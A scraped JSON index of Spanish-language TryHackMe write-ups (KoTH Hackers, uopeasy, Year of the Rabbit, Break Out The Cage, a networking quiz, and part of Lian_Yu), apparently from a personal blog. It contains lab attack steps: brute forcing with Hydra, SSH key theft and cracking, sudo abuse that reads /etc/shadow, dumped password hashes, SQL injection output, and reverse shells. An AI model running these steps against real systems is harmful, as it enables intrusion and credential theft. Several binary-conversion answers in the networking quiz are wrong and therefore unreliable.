-rw-r--r-- 1 ftp ftp 3771 Apr 29 03:58 .bashrc drwx------ 2 ftp ftp 4096 Jul 10 22:16 .cache -r-------- 1 ftp ftp 38 Apr 30 04:44 .flag drwx------ 3 ftp ftp 4096 Jul 10 22:16 .gnupg -rw-r--r-- 1 ftp ftp 807 Apr 29 03:58 .profile 226 Directory send OK.   GCRAWFORD - FTP/HYDRA Utilizamos nuevamente HYDRA pero esta vez con el usuario gcrawford en donde logramos obtener una contraseña para el servicio FTP.\nIngresamos al servicio y encontramos la clave privada y publica SSH de este usuario, además encontramos un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): gcrawford 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 6 ftp ftp 4096 Apr 30 04:25 . drwxr-x--- 6 ftp ftp 4096 Apr 30 04:25 .. lrwxrwxrwx 1 ftp ftp 9 Apr 30 01:31 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ftp ftp 220 Apr 29 04:00 .bash_logout -rw-r--r-- 1 ftp ftp 3771 Apr 29 04:00 .bashrc drwx------ 2 ftp ftp 4096 Apr 29 17:05 .cache drwx------ 3 ftp ftp 4096 Apr 29 17:05 .gnupg drwxrwxr-x 3 ftp ftp 4096 Apr 29 20:53 .local -rw-r--r-- 1 ftp ftp 807 Apr 29 04:00 .profile drwx------ 2 ftp ftp 4096 Jul 10 21:07 .ssh -r-------- 1 ftp ftp 252 Apr 30 04:25 business.txt 226 Directory send OK. ftp\u0026gt; cd .ssh 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 398 Jul 10 21:07 authorized_keys -rw------- 1 ftp ftp 1766 Jul 10 21:07 id_rsa -rw-r--r-- 1 ftp ftp 398 Jul 10 21:07 id_rsa.pub 226 Directory send OK. ftp\u0026gt; get id_rsa local: id_rsa remote: id_rsa 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for id_rsa (1766 bytes). 226 Transfer complete. 1766 bytes received in 0.00 secs (2.2396 MB/s) ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; get business.txt local: business.txt remote: business.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for business.txt (252 bytes). 226 Transfer complete. 252 bytes received in 0.00 secs (1.7935 MB/s) ftp\u0026gt; exit 221 Goodbye.   El archivo de texto contiene una flag.\nIntentamos autenticarnos con el archivo id_rsa en el servicio SSH pero al parecer el archivo esta protegido por una frase.\n1 2 3 4 5 6 7  root@upset:~/thm/kothhacker# ssh gcrawford@kothhacker.thm -i id_rsa Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Enter passphrase for key \u0026#39;id_rsa\u0026#39;: gcrawford@kothhacker.thm: Permission denied (publickey). root@upset:~/thm/kothhacker#   Utilizamos ssh2john para obtener el hash del archivo -id_rsa- y crackeamos el hash con john.\nLogramos obtener la frase y logramos obtener una shell con el usuario gcrawford.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando nano con el archivo bussines.txt. Utilizamos nano para obtener una shell root.\nLogramos obtener una flag en /root/.\nAgregamos nuestra clave publica al archivò authorized_keys e ingresamos con el usuario root en el servicio ssh.\nBuscamos la flag en el directorio /home y logramos encontrar las dos ultimas en /home/tryhackme/.flag y /home/production/.flag.\nPLAGUE - API/HYDRA En una de las paginas principales y en robots.txt encontramos un comentario que hacen enfasis en plague. Utilizamos Hydra y en donde el parametro usuario utilizamos plage.\nUtilizamos Hydra para intentar logearnos en /backdoor/shell, logramos encontrar la contraseña para plague.\nLogramos autenticarnos y ejecutar comandos.\nYa que podemos ejecutar comandos vamos a obtener una shell inversa.\nHacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando openssl. Utilizamos GTFOBINS para leer el archivo /etc/shadow.\n1 2  LFILE=/etc/shadow /usr/bin/sudo /usr/bin/openssl enc -in \u0026#34;$LFILE\u0026#34;   Logramos obtener el contenido, las contraseñas encriptadas.\n1 2 3 4 5  tryhackme:$6$m6t6Wwb.Irn8qFzm$LJ8sBnQX6.XDyqjQuL0XVoVSOXyRlcugWjbp3cN80Xl9344moBmQ/XdQfO2w5Oub4Kz0eBFG4KeP..05hFh171:18378:0:99999:7::: production:$6$CMJF8CIY$aq3ycncJkhhTa6h6vgec5Dr53cKJmQ.9Fa.7ZceaolrIr0B5DDKHZfV97GI0puAfrD.hCt0ZOBqtbt/RT/1TV.:18381:0:99999:7::: ftp:*:18381:0:99999:7::: rcampbell:$6$OlVRVXBb$5toooBVqa93gBtUncQNyMHeKvMdy.Wtr9eukllbmOv7wd8X.LaQR/tTYK9D1BCFSVGI3Pr/dD4U08d/8wNwES1:18453:0:99999:7::: gcrawford:$6$PujyDO0o$/TQMT0PNSCO.1qavpm26sCu9TAt.OTvjhQrXYVY5S.MNUg6XE0pxHnB3lRqfZEYo1Vjvyo8TY6CTE3FH/vzXL1:18453:0:99999:7:::   ","description":"KoTH Hackers es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.","id":69,"section":"posts","tags":[],"title":"TryHackMe - KoTH Hackers","uri":"https://sckull.github.io/posts/kothhacker/"},{"content":"  uopeasy es una maquina de TryHackMe, encontramos una vulnerabilidad SQL Injection donde obtuvimos credenciales para acceder a WordPress que luego nos dio acceso a la maquina. Escalamos privilegios con contraseñas almacenadas.\nRoom    Titulo uopeasy      Descripción *   Puntos *   Dificultad Media   Maker ben     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.80 scan initiated Mon Jul 6 22:53:12 2020 as: nmap -sV -o nmap_scan_mini uopeasy.thm Nmap scan report for uopeasy.thm (10.10.106.78) Host is up (0.16s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) 8080/tcp open http Apache httpd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 6 22:53:55 2020 -- 1 IP address (1 host up) scanned in 43.52 seconds # Nmap 7.80 scan initiated Mon Jul 6 22:53:19 2020 as: nmap -sV -p- -T5 -o nmap_scan uopeasy.thm Warning: 10.10.106.78 giving up on port because retransmission cap hit (2). Nmap scan report for uopeasy.thm (10.10.106.78) Host is up (0.18s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) 8080/tcp open http Apache httpd 11930/tcp filtered unknown 48235/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 6 22:57:59 2020 -- 1 IP address (1 host up) scanned in 279.92 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://uopeasy.thm/ -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /login.php (Status: 200) /phpmyadmin (Status: 301) /server-status (Status: 403)   HTTPS Encontramos una pagina web en el puerto 443 con una url que redirecciona a wordpress. La pagina que aparece en este puerto es la misma que la del puerto 8080.\nUtilizamos gobuster nuevamente para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://uopeasy.thm/ -q -t 25 -x php,html,txt -k /cgi-bin/.html (Status: 403) /favicon.ico (Status: 200) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /wordpress (Status: 301)   SQLi SQLMAP Capturamos los datos en la pagina /login.php con burpsuite y utilizamos sqlmap para verificar si podemos realizar inyeccion sql.\nLobramos obtener las bases de datos y al parecer utiliza una base de datos MySQL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  available databases [7]: [*] information_schema [*] login [*] mysql [*] performance_schema [*] phpmyadmin [*] users [*] wordpress8080 Database: login Table: users [2 entries] +----------+-----------+ | password | user_name | +----------+-----------+ | password | candyshop | | PopRocks | Sir | +----------+-----------+ Database: wordpress8080 Table: users [1 entry] +----------+---------------------+ | username | password | +----------+---------------------+ | admin | S[... snip ... ]d | +----------+---------------------+   DAEMON - USER Utilizamos las credenciales de la base de datos ingresar en wordpress.\nEditamos el archivo 404.php para agregar una shell inversa.\nLogramos obtener una shell con el usuario Deamon.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos, y en el archivo login.php encontramos nuevamente una contraseña, utilizamos esta con el usuario root y logramos obtener una shell con root.\nLas mismas credenciales para root nos permiten ingresar a phpmyadmin.\n","description":"uopeasy es una maquina de TryHackMe, encontramos una vulnerabilidad SQL Injection donde obtuvimos credenciales para acceder a WordPress que luego nos dio acceso a la maquina. Escalamos privilegios con contraseñas almacenadas.","id":70,"section":"posts","tags":["sqli","sqlmap","wordpress"],"title":"TryHackMe - uopeasy","uri":"https://sckull.github.io/posts/uopeasy/"},{"content":"  BP: Networking de TryHackMe es una serie de conceptos y ejercicios sobre redes.\nRoom    Titulo Networking      Descripción Learn the basics of networking and network addressing   Puntos 1440   Dificultad Facil   Maker DarkStar7471     Kinda like a street address, just cooler. Todas las computadoras tienen una direccion ip. Aca se definen los diferentes tipos de direcciones IP.\n  Clases de direcciones IP\n   Clase Rango     Clase A 1-127   Clase B 128-191   Clase C 192-223   Clase D 224-239   Clase E 240-255    Espacio de direcciones privadas\n   Clase Rango     Clase A 10.0.0.0   Clase B 172.16.0.0 a 172.31.255.255   Clase C 192.168.0.0 a 192.168.255.255    SPOILER WARNING  RESPUESTAS - SPOILER WARNING How many categories of IPv4 addresses are there?\n5 - Existen 5 clases de direcciones IP\n*Which type is for research? Looking for a letter rather than a number here\nE - Esta clase IP está reservado para fines experimentales sólo para R\u0026amp;D o estudio.\nHow many private address ranges are there?\n3 - Existen 3 clases de direcciones IP Privadas\nWhich private range is typically used by businesses?\nA - Clase privada\nThere are two common default private ranges for home routers, what is the first one?\n192.168.0.0 - Comunmente utilizada para routers de casa.\nHow about the second common private home range?\n192.168.1.0- Comunmente utilizada para routers de casa.\nHow many addresses make up a typical class C range? Specifically a /24\n256 - 254 + 2 (reservadas)\nOf these addresses two are reserved, what is the first addresses typically reserved as?\nnetwork\nThe very last address in a range is typically reserved as what address type?\nbroadcast - **172.31.255.255 Ejemplo **\nA third predominant address type is typically reserved for the router, what is the name of this address type?\ngateway - gateway\nWhich address is reserved for testing on individual computers?\n127.0.0.1 - localhost\nA particularly unique address is reserved for unroutable packets, what is that address? This can also refer to all IPv4 addresses on the local machine.\n0.0.0.0 - 0.0.0.0\n Binary to Decimal   En esta parte debemos de realizar la conversion de binario a Decimal, para hacer esto utilizamos la siguiente tabla:\n   128 64 32 16 8 4 2 1    Para poder convertir de binario a decimal (utilizando la tabla) ordenamos los numeros (0\u0026rsquo;s y 1\u0026rsquo;s) de tal forma que queden ordenados con los valores de arriba. Si el numero es 1 tomamos el numero, si es 0, no.\n   128 64 32 16 8 4 2 1     1 0 0 1 0 0 1 0    Si el numero es 1 tomamos el numero, si es 0, no.\n   Numeros Guia 128 64 32 16 8 4 2 1     Binario 1 0 0 1 0 0 1 0   Decimal 128 0 0 16 0 0 2 0    Ahora que tenemos los numeros, sumamos todos (no es necesario tomar los 0\u0026rsquo;s) y obtenemos el resultado:\n   128+0+0+16+0+0+2+0 = 146    Realizamos lo mismo para todos los numeros.\nSPOILER WARNING  RESPUESTAS - SPOILER WARNING 1001 0010 = 128+16+2 = 146 0111 0111 = 64+32+16+4+2+1 = 119 1111 1111 = 128+64+32+16+8+4+2+1 = 255 1100 0101 = 128+64+4+1 = 197 1111 0110 = 128+64+32+16+4+2 = 246 0001 0011 = 16+2+1 = 19 1000 0001 = 128+1 = 129 0011 0001 = 32+16+1 = 49 0111 1000 = 64+32+16+8 = 120 1111 0000 = 128+64+32+16 = 240 0011 1011 = 32+16+8+2+1 = 59 0000 0111 = 4+2+1 = 7  Decimal to Binary    Para convertir de decimal a Binario, tomamos el numero y lo dividimos dentro de 2, hasta llegar a su minima expresion (0). Si el resultado o numero es par entonces colocamos 0 si es impar 1. El primer número quedaria de la siguiente forma:\n238 = 238 -----\u0026gt; 0 238 / 2 = 119 -----\u0026gt; 1 119 / 2 = 59 -----\u0026gt; 1 59 / 2 = 29 -----\u0026gt; 1 29 / 2 = 14 -----\u0026gt; 0 14 / 2 = 7 -----\u0026gt; 1 7 / 2 = 3 -----\u0026gt; 1 3 / 2 = 1 -----\u0026gt; 1 El resultado se lee de abajo hacia arriba: 1110 1110.\nRealizamos lo mismo para todos los numeros.\nSPOILER WARNING  RESPUESTAS - SPOILER WARNING 1 2 3 4 5 6 7 8 9 10 11  34 = 0100 1000 123 = 0111 1011 50 = 0011 0010 255 = 01111 1111 200 = 0110 0100 10 = 0101 0000 138 = 0100 0101 1 = 0000 0001 13 = 0000 1101 250 = 0111 1101 114 = 0111 0010    Address Class Identification En esta seccion se necesita identificar a la clase que pertenece la IP dada utilizando la tabla.\nClases de direcciones IP\n   Clase Rango     Clase A 1-127   Clase B 128-191   Clase C 192-223   Clase D 224-239   Clase E 240-255    Espacio de direcciones privadas\n   Clase Rango     Clase A 10.0.0.0   Clase B 172.16.0.0 a 172.31.255.255   Clase C 192.168.0.0 a 192.168.255.255    SPOILER WARNING  RESPUESTAS - SPOILER WARNING 1 2 3 4 5 6 7 8 9 10 11 12  10.240.1.1 = A 150.10.15.0 = B 192.14.2.0 = C 148.17.9.1 = B 193.42.1.1 = C 126.8.156.0 = A 220.200.23.1 = C 230.230.45.58 = D 177.100.18.4 = B 119.18.45.0 = A 117.89.56.45 = A 215.45.45.0 = C   Obtener respuestas de Forma Facil\n Links de ayuda\nDirección IP\nIPv4 - Direcciones Reservadas\ncommon router default DHCP IP address ranges?\n","description":"BP: Networking de TryHackMe es una serie de conceptos y ejercicios sobre redes.","id":71,"section":"posts","tags":[],"title":"TryHackMe - BP: Networking","uri":"https://sckull.github.io/posts/bpnetworking/"},{"content":"  Year of the Rabbit es una maquina de TryHackMe, la maquina nos proporciona un wordlist que encontramos en una imagen y utilizamos en FTP para realizar un ataque de fuerza bruta con Hydra, tras acceder encontramos un pequeño que nos proporciono credenciales para acceder por SSH. Cambiamos de usuario con contraseñas almacenadas. Escalamos privilegios con una vulnerabilidad en Sudo y con Vi.\nRoom    Titulo Year of the Rabbit      Descripción Time to enter the warren\u0026hellip;   Puntos 310   Dificultad Facil   Maker MuirlandOracle     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  # Nmap 7.80 scan initiated Sun Jun 28 21:19:18 2020 as: nmap -sV -o nmap_scan_mini rabbit.thm Nmap scan report for rabbit.thm (10.10.93.147) Host is up (0.22s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.10 ((Debian)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 28 21:19:55 2020 -- 1 IP address (1 host up) scanned in 36.98 seconds # Nmap 7.80 scan initiated Sun Jun 28 21:19:17 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan rabbit.thm Nmap scan report for rabbit.thm (10.10.93.147) Host is up (0.17s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 28 21:35:05 2020 -- 1 IP address (1 host up) scanned in 947.91 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  root@upset:~/thm/yearoftherabbit# gobuster dir -u http://rabbit.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   En el directorio assets encontramos dos archivos, un archivo mp4 y una hoja de estilos (CSS).\nEn la hoja de estilos encontramos una direccion hacia una pagina.\nAl visitar la pagina nos redirige hacia un video de youtube, desactivamos javascript en nuestro navegador y vemos un video incrustado en la pagina, es el mismo que se encuentra en /assets/.\nUtilizamos BurpSuite y encontramos que realiza una peticion a una pagina con un parametro de un directorio.\nIntentamos realizar detectar alguna vulnerabilidad en esta pagina y su parametro pero no encontramos alguno. Ya que indica un directorio, utilizamos este en la pagina y encontramos una imagen.webp.\nFTP - USER Descargamos la imagen y revisamos las strings dentro de esta, encontramos un mensaje con una lista de posibles contraseñas de un usuario en el servicio ftp.\nUtilizamos HYDRA con el usuario y wordlist encontrado en el servicio ftp y logramos encontrar las credenciales.\nDentro, encontramos un archivo txt. Que al revisarlo encontramos que esta en el lenguaje brainfuck.\nUSER - ELI Utilizamos un dcode.fr para obtener en texto plano el mensaje, en donde encontramos unas credenciales.\nUtilizamos las credenciales en el servicio SSH y obtenemos una shell.\nUSER - GWENDOLINE Al entrar a este servicio nos muestra un mensaje de root para Gwendoline.\nBuscamos el lugar \u0026ldquo;s3cr3t\u0026rdquo; y encontramos un archivo donde está la contraseña de Gwendoline.\nUtilizamos la contraseña para elevar a Gwendoline y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vi en el archivo user.txt.\nIntentamos utilizar el comando con sudo pero no nos permitió.\nVerificamos la version de sudo, buscamos un exploit/vulnerabilidad relacionado y vemos sudo 1.8.27 - Security Bypass, intentamos utilizar este \u0026ldquo;exploit\u0026rdquo;, logramos ejecutar vi con sudo, obtener una shell root utilizando :!sh en vi y nuestra flag root.txt.\n","description":"Year of the Rabbit es una maquina de TryHackMe, la maquina nos proporciona un wordlist que encontramos en una imagen y utilizamos en FTP para realizar un ataque de fuerza bruta con Hydra, tras acceder encontramos un pequeño que nos proporciono credenciales para acceder por SSH. Cambiamos de usuario con contraseñas almacenadas. Escalamos privilegios con una vulnerabilidad en Sudo y con Vi.","id":72,"section":"posts","tags":["ftp","brainfuck","vim","sudo privesc"],"title":"TryHackMe - Year of the Rabbit","uri":"https://sckull.github.io/posts/yearoftherabbit/"},{"content":"  Break Out The Cage es una maquina de TryHackMe, presenta retos para obtener credenciales y acceso a la maquina, para el movimiento lateral analizamos un script y modificamos un archivo dependiente. Un reto nos permitió obtener la contraseña del usuario root.\nRoom    Titulo Break Out The Cage      Descripción Help Cage bring back his acting career and investigate the nefarious goings on of his agent!   Puntos 240   Dificultad Facil   Maker Magna     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Sat Jun 27 22:24:17 2020 as: nmap -sV -o nmap_scan_mini breakthecage.thm Nmap scan report for breakthecage.thm (10.10.15.25) Host is up (0.16s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 22:25:00 2020 -- 1 IP address (1 host up) scanned in 43.71 seconds # Nmap 7.80 scan initiated Sat Jun 27 22:24:15 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan breakthecage.thm Nmap scan report for breakthecage.thm (10.10.15.25) Host is up (0.15s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 396 May 25 23:33 dad_tasks | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.6.160 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA) | 256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA) |_ 256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Nicholas Cage Stories Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 22:50:38 2020 -- 1 IP address (1 host up) scanned in 1582.44 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/breakoutthecage# gobuster dir -u http://breakthecage.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 125 -x php,html,txt /images (Status: 301) /html (Status: 301) /scripts (Status: 301) /index.html (Status: 200) /contracts (Status: 301) /auditions (Status: 301)   Encontramos un directorio en donde hay un archivo mp3.\nUtilizamos Sonic Visualiser para verificar que el archivo no tenga algo dentro agregando una capa de espectrograma. Logramos ver una palabra que seguramente nos servira. Puede que alguna de las letras sea engañosa, audacity tambien trae la opcion de agregar una capa de espectrograma.\nFTP - Task 1 Nos conectamos al servicio FTP con las credenciales de anonymous:anonymous y encontramos un archivo que esta codificado en base64.\nUtilizamos CyberChef para decodificar el mensaje, al realizar esto vemos el mensaje \u0026ldquo;descompuesto\u0026rdquo;. Utilizamos Vigenere Cipher con la palabra que encontramos para obtener el mensaje real. Task 1\nUSER - WESTON -\u0026gt; CAGE Ahora que encontramos la contraseña de weston iniciamos sesion en el servicio ssh. Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /usr/bin/bees. El archivo contiene un comando, pero este no puede ser editado por el usuario actual.\nUtilizamos pspy64 para ver si existe algun cronjob en la maquina, esto porque durante la enumeracion de los archivos se imprimia un mensaje diferente en pantalla.\nEncontramos un archivo que se ejecuta y se encuentra en el directorio /opt/.\nEl codigo del script en python lee el archivo .quotes en el que hay una larga lista de frases, elige una aleatoria, la imprime mediante el comando wall.\nPara poder tomar ventaja de este script deberia de quedar de la siguiente forma para poder ejecutar comandos y una posible shell inversa.\nRenombramos el archivo .quotes, creamos uno nuevo con una frase y nuestra shell inversa.\nPonemos a la escucha netcat en nuestra maquina, esperamos, y logramos obtener una shell con el usuario cage.\nY nuestra flag user.txt.\nPRIVILEGE ESCALATION En la carpeta principal de cage encontramos el archivo id_rsa que nos da acceso a una shell en el servicio ssh. En la carpeta email_backup encontramos varios correos en tres archivos. En uno de ellos hablan sobre una nota y lo que esta decia.\nIntentamos utilizarla como contraseña del usuario root pero no funcionó, por lo que utilizamos nuevamente vignere cipher pero esta vez no teniamos la clave y utilizamos dcode.fr ya que nos muestra una lista de posibles claves y su resultado. Logramos encontrar su clave y el mensaje real.\nUtilizamos el mensaje real como contraseña del usuario root y logramos obtener acceso con este usuario, además encontramos nuevamente un backup de correos en su carpeta principal y en uno de ellos nuestra flag *root.txt.\n","description":"Break Out The Cage es una maquina de TryHackMe, presenta retos para obtener credenciales y acceso a la maquina, para el movimiento lateral analizamos un script y modificamos un archivo dependiente. Un reto nos permitió obtener la contraseña del usuario root.","id":73,"section":"posts","tags":["ftp","steganography","vigenere"],"title":"TryHackMe - Break Out The Cage","uri":"https://sckull.github.io/posts/breakthecage/"},{"content":"  Lian_Yu es una maquina de TryHackMe, la enumeracion permitió obtener credenciales para FTP donde encontramos un reto de Esteganografia que nos dio acceso. finalmente obtuvimos una shell root con pkexec.\nRoom    Titulo Lian_Yu      Descripción A beginner level security challenge   Puntos 180   Dificultad Facil   Maker Deamon     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), 80 (http) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  # Nmap 7.80 scan initiated Sat Jun 27 01:14:57 2020 as: nmap -sV -o nmap_scan_mini lianyu.thm Nmap scan report for lianyu.thm (10.10.79.149) Host is up (0.15s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 80/tcp open http Apache httpd 111/tcp open rpcbind 2-4 (RPC #100000) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 01:15:31 2020 -- 1 IP address (1 host up) scanned in 33.78 seconds # Nmap 7.80 scan initiated Sat Jun 27 01:15:08 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan lianyu.thm Warning: 10.10.79.149 giving up on port because retransmission cap hit (6). Nmap scan report for lianyu.thm (10.10.79.149) Host is up (0.15s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA) | 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA) | 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA) |_ 256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Purgatory 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35854/udp6 status | 100024 1 39587/tcp6 status | 100024 1 40288/udp status |_ 100024 1 47359/tcp status 7573/tcp filtered unknown 8324/tcp filtered unknown 12786/tcp filtered unknown 14426/tcp filtered unknown 18334/tcp filtered unknown 24024/tcp filtered unknown 27137/tcp filtered unknown 37836/tcp filtered unknown 40619/tcp filtered unknown 47359/tcp open status 1 (RPC #100024) 49276/tcp filtered unknown 54432/tcp filtered unknown 56048/tcp filtered unknown 60898/tcp filtered unknown Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 01:41:23 2020 -- 1 IP address (1 host up) scanned in 1574.59 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 250 -x php,html,txt /index.html (Status: 200) /island (Status: 301)   Encontramos una pagina donde hay una palabra clave.\nNuevamente ejecutamos 